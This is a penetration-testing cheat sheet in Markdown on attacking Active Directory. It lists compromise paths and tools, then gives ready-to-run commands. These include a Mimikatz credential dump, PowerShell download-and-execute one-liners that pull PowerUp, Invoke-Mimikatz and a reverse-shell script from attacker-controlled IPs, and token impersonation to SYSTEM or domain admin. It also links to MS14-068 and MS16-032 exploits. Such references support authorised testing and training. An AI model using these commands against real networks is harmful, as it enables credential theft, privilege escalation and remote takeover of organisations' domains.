# Active Directory Attacks

## Most common paths to AD compromise
  * MS14-068
  * MS17-010 (Eternal Blue - Local Admin)
    ```c
    nmap -Pn -p445 — open — max-hostgroup 3 — script smb-vuln-ms17–010 <ip_netblock>
    ```
  * Unconstrained Delegation (incl. pass-the-ticket)
  * OverPass-the-Hash (Making the most of NTLM password hashes)
  * Pivoting with Local Admin & Passwords in SYSVOL
  * Dangerous Built-in Groups Usage
  * Dumping AD Domain Credentials
  * Golden Tickets
  * Kerberoast
  * Silver Tickets
  * Trust Tickets


## Tools
  * [Impacket](https://github.com/CoreSecurity/impacket)
  * Responder
  * Mimikatz
  * [Ranger](https://github.com/funkandwagnalls/ranger)
  * BloodHound
  * RottenPotato

## Mimikatz
```
load mimikatz
mimikatz_command -f sekurlsa::logonPasswords full
```

## PowerSploit
```
https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon
powershell.exe -nop -exec bypass -c “IEX (New-Object Net.WebClient).DownloadString('http://10.11.0.47/PowerUp.ps1'); Invoke-AllChecks”
powershell.exe -nop -exec bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://10.10.10.10/Invoke-Mimikatz.ps1');"
```


## PrivEsc - Token Impersonation (RottenPotato)
Binary available at : https://github.com/foxglovesec/RottenPotato      
Binary available at : https://github.com/breenmachine/RottenPotatoNG   
```c
getuid
getprivs
use incognito
list\_tokens -u
cd c:\temp\
execute -Hc -f ./rot.exe
impersonate\_token "NT AUTHORITY\SYSTEM"
```

```
Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
```

## PrivEsc - MS14-068
```
Exploit Python : https://www.exploit-db.com/exploits/35474/

Doc: https://github.com/gentilkiwi/kekeo/wiki/ms14068
```

## PrivEsc - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
```
Powershell:
https://www.exploit-db.com/exploits/39719/
https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1

Binary exe : https://github.com/Meatballs1/ms16-032

Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
```

## Kerberoast
```
https://powersploit.readthedocs.io/en/latest/Recon/Invoke-Kerberoast/
https://room362.com/post/2016/kerberoast-pt1/
```

## Thanks to
 * [https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html](https://chryzsh.gitbooks.io/darthsidious/content/compromising-ad.html)
 * [Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher](https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa)
 * [Road to DC](https://steemit.com/infosec/@austinhudson/road-to-dc-part-1)
